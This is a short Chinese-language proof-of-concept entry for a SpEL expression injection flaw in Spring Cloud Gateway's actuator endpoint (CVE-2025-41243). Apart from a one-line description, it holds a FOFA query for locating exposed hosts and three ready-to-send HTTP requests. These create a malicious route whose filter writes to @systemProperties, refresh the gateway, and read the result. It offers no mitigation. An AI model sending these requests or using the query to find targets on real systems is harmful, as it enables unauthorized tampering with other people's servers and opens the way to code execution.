## Spring Cloud Gateway SpEL表达式注入漏洞（CVE-2025-41243）

## 漏洞描述
Spring Cloud Gateway 存在 SpEL 表达式注入漏洞，攻击者可访问注册的 `@systemProperties` bean 并修改配置，最终执行恶意表达式。

## 网络空间测绘
```
fofa: body="Whitelabel Error Page" || title="Example Domain"
```

## POC
```
POST /actuator/gateway/routes/UnUc6bEY HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept-Encoding: gzip
Content-Type: application/json
Content-Length: 472

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/actuators/SQIpjU"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "/SQIpjU",
        "_genkey_1": "#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = true}"
      }
    }
  ],
  "uri": "http://example.com",
  "order": -1
}
```

```
GET /actuator/gateway/refresh HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```
GET /actuator/gateway/routes/UnUc6bEY HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (SS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

## 参考
- 社区情报

